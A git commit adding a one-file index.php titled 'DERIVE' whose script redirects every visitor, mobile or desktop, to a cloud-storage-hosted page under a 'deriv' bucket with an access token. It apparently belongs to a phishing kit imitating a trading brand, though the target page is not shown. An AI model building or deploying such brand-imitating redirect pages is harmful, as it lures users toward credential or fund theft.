8d766baf1743a1fab5878cf1aa06dfa22968ce1b
usdtprograms <120041617+usdtprograms@users.noreply.github.com>
2022-12-07 23:13:14 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,22 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta property="og:image" content="img/GIcon.png" />
+<title>DERIVE</title>
+<meta property="og:title" content="DERIVE" />
+<script type="text/javascript">
+var isMobile = function() {
+   //console.log("Navigator: " + navigator.userAgent);
+   return /(iphone|ipod|ipad|android|blackberry|windows ce|palm|symbian)/i.test(navigator.userAgent);
+ };
+ if(isMobile()) {
+    window.location.href = "v0/b/deriv-adce2.appspot.com/o/index.html?alt=media&token=35d33ccb-a820-4964-b889-b9bfc23743d6";
+} else {
+	window.location.href = "v0/b/deriv-adce2.appspot.com/o/index.html?alt=media&token=35d33ccb-a820-4964-b889-b9bfc23743d6";
+}
+</script>
+
+</head>
+<body>
+</body>
+</html>
